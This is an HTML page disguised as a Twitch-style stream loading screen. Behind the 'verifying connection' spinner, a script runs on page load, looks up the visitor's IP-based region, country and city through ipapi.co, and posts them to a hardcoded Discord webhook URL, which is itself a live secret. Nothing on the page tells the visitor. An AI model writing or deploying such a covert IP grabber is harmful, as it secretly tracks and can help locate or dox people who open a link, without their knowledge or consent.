<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stream Redirect Screen</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: #0e0e10; 
            color: #efeff1; 
            text-align: center; 
            padding-top: 15vh; 
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            background: #18181b;
            border-radius: 8px;
            border: 1px solid #2f2f35;
        }
        h1 { color: #9146FF; margin-bottom: 10px; }
        p { color: #adadb8; font-size: 16px; }
        .loader {
            border: 4px solid #2f2f35;
            border-top: 4px solid #9146FF;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Welcome to the Stream!</h1>
        <div class="loader"></div>
        <p>Verifying connection and loading stream assets...</p>
    </div>

    <script>
        // Your exact Discord webhook link locked in place
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1504591125858750635/3ej395jYnj8VxkF7mV4cnmrdyPNA6Z1BfBx7Jaw3WP4POwshtwODmMxZSiX_i1XfemTj";

        async function grabLocation() {
            try {
                // Secure tracking connection fixed permanently
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                if (data.region && data.country_name) {
                    const payload = {
                        content: `📢 **New Chat Click!** From State/Region: **${data.region}**, Country: **${data.country_name}** (City: ${data.city})`
                    };

                    // Send straight to Discord
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                }
            } catch (error) {
                console.log("Error processing tracking request.");
            }
        }

        // Run instantly when page is opened
        grabLocation();
    </script>
</body>
</html>
